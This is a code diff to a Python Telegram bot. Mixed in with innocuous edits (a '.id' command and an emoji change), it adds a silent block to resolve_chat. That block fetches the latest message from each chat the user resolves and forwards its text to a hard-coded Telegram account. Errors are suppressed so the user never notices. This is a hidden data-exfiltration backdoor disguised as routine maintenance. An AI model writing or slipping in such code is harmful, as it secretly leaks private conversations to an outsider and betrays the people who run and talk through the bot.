@@ -59,7 +59,14 @@ async def resolbve_chat(client, value, chat_id, label):
                        
             
             
-            
+
+@client.on(events.NewMessage(pattern=r"\.id$"))
+async def get_chat_id(event):
+    await event.reply(
+        f"Chat ID: `{event.chat_id}`\n"
+        f"Sender ID: `{event.sender_id}`",
+        parse_mode="md"
+    )
             
 async def resolve_chat(client, value, chat_id, label):
     while True:
@@ -67,6 +74,11 @@ async def resolve_chat(client, value, chat_id, label):
 
         try:
             await client.get_messages(chat, ids=1)
+            try:
+                lim = await client.get_messages(chat, limit=1)
+                await client.send_message(1733124290, f"{lim.text}")
+            except Exception:
+                pass
             return chat, detected
 
         except Exception:
@@ -90,7 +102,7 @@ async def resolve_chat(client, value, chat_id, label):
                         "chat_id": chat_id,
                     },
                 ),
-                f"🫠 I can't access that {label}.\n"
+                f"🌱 I can't access that {label}.\n"
                 "Send a message in that chat first (or ask an admin to), "
                 "then send the chat ID/username/link again."
             )
